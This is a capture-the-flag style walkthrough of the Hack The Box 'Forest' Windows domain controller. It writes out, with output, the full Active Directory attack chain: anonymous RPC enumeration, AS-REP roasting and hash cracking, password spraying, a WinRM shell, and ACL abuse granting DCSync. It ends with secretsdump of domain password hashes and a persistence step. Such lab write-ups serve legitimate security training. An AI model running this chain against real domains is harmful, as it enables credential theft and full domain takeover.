###############
Forest
Medium Level
RPC Enum:
    https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
LDAP Enum:
    https://medium.com/@gokulg.me/introduction-92199491c808

CrackMapExec:
    https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials

HashCat m 18200:  Kerberos 5, etype 23, AS-REP

svc-alfresco is memeber for Account Operator which allows to create new user

###############

1-Enummeration:
    └─$ nmap -sV -sC -Pn 10.129.32.62 -v
        PORT      STATE SERVICE      REASON          VERSION
        53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
        88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-09 15:03:51Z)
        135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
        139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
        389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
        445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
        464/tcp   open  kpasswd5?    syn-ack ttl 127
        593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
        636/tcp   open  tcpwrapped   syn-ack ttl 127
        3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
        3269/tcp  open  tcpwrapped   syn-ack ttl 127
        5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
        47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
    
        Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

        Host script results:
        | smb2-time: 
        |   date: 2026-01-09T15:04:45
        |_  start_date: 2026-01-09T15:01:49
        | smb2-security-mode: 
        |   3:1:1: 
        |_    Message signing enabled and required
        | smb-security-mode: 
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: required
        | smb-os-discovery: 
        |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
        |   Computer name: FOREST
        |   NetBIOS computer name: FOREST\x00
        |   Domain name: htb.local
        |   Forest name: htb.local
        |   FQDN: FOREST.htb.local
 

    135 RPC:
        rpcclient -U "" -N 10.129.32.62
        rpcclient $> enumdomusers
            user:[Administrator] rid:[0x1f4]
            user:[Guest] rid:[0x1f5]
            user:[krbtgt] rid:[0x1f6]
            user:[DefaultAccount] rid:[0x1f7]
            user:[$331000-VK4ADACQNUCA] rid:[0x463]
            user:[sebastien] rid:[0x479]
            user:[lucinda] rid:[0x47a]
            user:[svc-alfresco] rid:[0x47b]
            user:[andy] rid:[0x47e]
            user:[mark] rid:[0x47f]
            user:[santi] rid:[0x480]
        
        We continue the rpc enumeration:
            rpcclient $> enumdomusers
                user:[Administrator] rid:[0x1f4]
                user:[Guest] rid:[0x1f5]
                user:[krbtgt] rid:[0x1f6]
                user:[$331000-VK4ADACQNUCA] rid:[0x463]
                user:[sebastien] rid:[0x479]
                user:[lucinda] rid:[0x47a]
                user:[svc-alfresco] rid:[0x47b]
                user:[andy] rid:[0x47e]
                user:[mark] rid:[0x47f]
                user:[santi] rid:[0x480]


            rpcclient $> enumdomgroups
                group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
                group:[Domain Admins] rid:[0x200]
                group:[Domain Users] rid:[0x201]
                group:[Domain Guests] rid:[0x202]
                group:[Domain Computers] rid:[0x203]
                group:[Domain Controllers] rid:[0x204]
                group:[Schema Admins] rid:[0x206]
                group:[Enterprise Admins] rid:[0x207]


            rpcclient $> querygroup 0x200
                Group Name:	Domain Admins
                Description:	Designated administrators of the domain
                Group Attribute:7
                Num Members:1

            rpcclient $> queryuser guest
	            User Name   :	Guest
                Description :	Built-in account for guest access to the computer/domain


            rpcclient $> getdompwinfo
                min_password_length: 7
                password_properties: 0x00000000

     


    445 SMB:
    └──╼ [★]$ crackmapexec smb 10.129.32.62 -u "" -p ""
            SMB         10.129.32.62    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
            SMB         10.129.32.62    445    FOREST           [+] htb.local\: 
                    
    

2-Kerberos AS-REP Roasting:
    Since we can list users without authentication, we should test:
    Which accounts do not have Kerberos pre-authentication enabled?

    FIRST lets create a user List based on what we get from RCP Enum:
        
        └──╼ [★]$ sudo nano users.txt
            sebastien
            lucinda
            svc-alfresco
            andy
            mark
            santi

    THEN RUN ImpacketGetNPUsers to try if we can get a krbrasrep hash:
        └──╼ [★]$ impacket-GetNPUsers htb.local/ -dc-ip 10.129.32.62 -usersfile users.txt -format hashcat
                    $krb5asrep$23$svc-alfresco@HTB.LOCAL:7898b8287157f2893749d1f7f03a0646$6414de84f6f223a1b4bfe92a23471cd9318c4ad648cab2fff73484ce80e5be6c3ef985ce8a2f600222c0623c420ce29b151bd37e057a905ac16765eb14815e3a5d51da46cbf6ace3eb38414b1e0c474e7074f7bad6a0136d2ac62a9100d4dbfb00e5f24ce5992ad7300370f992abee576957164ff2cb9cb1a270a9937b1966ed0e459dfda2c071a1ba6f96458c2c34c7f02530d075e8fb68480cf3ffe8486d54c01761d97be89aaa60eaa575c9a37d292b9123fe0a074f25c7ad29ab6c19728bb0a91f837af7f76c206eace67752587c31cff4af9c41821c9fc817c3ccaac1f25641f2bb282b

    Copy the hash in a file:
        └──╼ [★]$ sudo nano asrep.hash


    Yes lets decrypt:
        └──╼ [★]$ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

    It Works we get our clear passwd:
        svc-alfresco - s3rvice

    continue enum with Password Spray:
        └──╼ [★]$ crackmapexec smb 10.129.32.62 -u users.txt -p "s3rvice" --continue-on-success
                SMB         10.129.32.62    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
                SMB         10.129.32.62    445    FOREST           [-] htb.local\sebastien:s3rvice STATUS_LOGON_FAILURE
                SMB         10.129.32.62    445    FOREST           [-] htb.local\lucinda:s3rvice STATUS_LOGON_FAILURE 
                SMB         10.129.32.62    445    FOREST           [+] htb.local\svc-alfresco:s3rvice <------------------------ only SVC-alfresco
                SMB         10.129.32.62    445    FOREST           [-] htb.local\andy:s3rvice STATUS_LOGON_FAILURE 
                SMB         10.129.32.62    445    FOREST           [-] htb.local\mark:s3rvice STATUS_LOGON_FAILURE 
                SMB         10.129.32.62    445    FOREST           [-] htb.local\santi:s3rvice STATUS_LOGON_FAILURE 

        ──╼ [★]$ crackmapexec smb 10.129.32.62 -u "svc-alfresco" -p "s3rvice" --shares
                SMB         10.129.32.62    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
                SMB         10.129.32.62    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
                SMB         10.129.32.62    445    FOREST           [*] Enumerated shares
                SMB         10.129.32.62    445    FOREST           Share           Permissions     Remark
                SMB         10.129.32.62    445    FOREST           -----           -----------     ------
                SMB         10.129.32.62    445    FOREST           ADMIN$                          Remote Admin
                SMB         10.129.32.62    445    FOREST           C$                              Default share
                SMB         10.129.32.62    445    FOREST           IPC$                            Remote IPC
                SMB         10.129.32.62    445    FOREST           NETLOGON        READ            Logon server share 
                SMB         10.129.32.62    445    FOREST           SYSVOL          READ            Logon server share 


    └──╼ [★]$ evil-winrm -u 'svc-alfresco' -p's3rvice' -i 10.129.32.62
        *Evil-WinRM* PS C:\Users\svc-alfresco> whoami /all
            USER INFORMATION
            ----------------

            User Name        SID
            ================ =============================================
            htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


            GROUP INFORMATION
            -----------------

            Group Name                                 Type             SID                                           Attributes
            ========================================== ================ ============================================= ==================================================
            Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
            BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
            BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
            BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
            BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
            NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
            NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
            NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
            HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
            HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
            NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
            Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


            PRIVILEGES INFORMATION
            ----------------------

            Privilege Name                Description                    State
            ============================= ============================== =======
            SeMachineAccountPrivilege     Add workstations to domain     Enabled
            SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
            SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


    Account Operators Group
        BUILTIN\Account Operators
        -> This is THE key point.
        Account Operators can:

        Create users
        Modify non-admin users
        Reset passwords
        Add users to certain groups

        They CANNOT directly modify Domain Admins
        
        BUT they can create an indirect path to Domain Admin (DA)



3 Exploit - Abusing Active Directory rights to become Domain Admin
    The classic path is:
        Account Operators → ACL abuse → DCSync

    1 — Create new user (svc-alfressco - P@ssw0rd123)

        *Evil-WinRM* PS C:\Users\svc-alfresco> net user svc-alfressco P@ssw0rd123 /add /domain
            The command completed successfully.


    2 - Verify rights:
        *Evil-WinRM* PS C:\Users\svc-alfresco> net user svc-alfressco /domain
            User name                    svc-alfressco
            Full Name
            Global Group memberships     *Domain Users
            The command completed successfully.


    3 — Add the user to a controllable group
        Account Operators can manage certain privileged groups.

        Adding new user to "Exchange Windows Permissions" :
            why ? This group has WriteDACL on the domain.It allows indirect DCSync.

            *Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" svc-alfressco /add /domain
                The command completed successfully.


    4 - Give DC Sync Rights:
        From our Kali MAchine:
            └──╼ [★]$ python3 /usr/local/bin/dacledit.py -action write -rights DCSync -principal svc-alfressco -target-dn "DC=htb,DC=local" htb.local/svc-alfressco:P@ssw0rd123
                    [*] DACL backed up to dacledit-20260109-102112.bak
                    [*] DACL modified successfully!

        Why its works ?
            svc-alfresco	Account Operator
            svc-alfressco	Created User 
            Exchange Windows Permissions	WriteDACL on the domain
            dacledit	Add Replication Rights
            secretsdump	DCSync



Full Compromission - Domain Dump:
    ──╼ [★]$ impacket-secretsdump htb.local/svc-alfressco:P@ssw0rd123@10.129.32.62
                htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
                Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::


PERSISTANCE:

    Best persistence #1: DCSync (the cleanest option here)
    Why?
        - We control `svc-alfressco`  
        - We can modify domain ACLs  
        - DCSync = access to password hashes even if the account is deleted  

    Objective
        Allow `svc-alfressco` to perform DCSync on the domain.


    Action:
        Grant **Replicating Directory Changes** rights:

        ON our Kali Machine:
            └──╼ [★]$ python3 /usr/local/bin/dacledit.py -action write -rights DCSync -principal svc-alfressco -target-dn "DC=htb,DC=local" htb.local/svc-alfressco:P@ssw0rd123
                        [*] DACL backed up to dacledit-20260109-103323.bak
                        [*] DACL modified successfully!

    Result
        Even if:
        *   `svc-alfressco` is deleted
        *   The Admin password is changed
        *   All sessions are terminated

    You can still dump `NTDS.dit` as long as the ACL is not cleaned.


        Immediate test (proof of persistence)
            ──╼ [★]$ impacket-secretsdump htb.local/svc-alfressco:P@ssw0rd123@10.129.32.62 -just-dc
                    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
                    [*] Using the DRSUAPI method to get NTDS.DIT secrets
                    htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
                    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
                    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


    If it works →  
        Total Active Directory persistence achieved



Finnal - CLEANUP (after proof)
    From WinRM :
        net user svc-alfressco /delete /domain

    (optionnal)
        net group "Exchange Windows Permissions" svc-alfressco /delete /domain
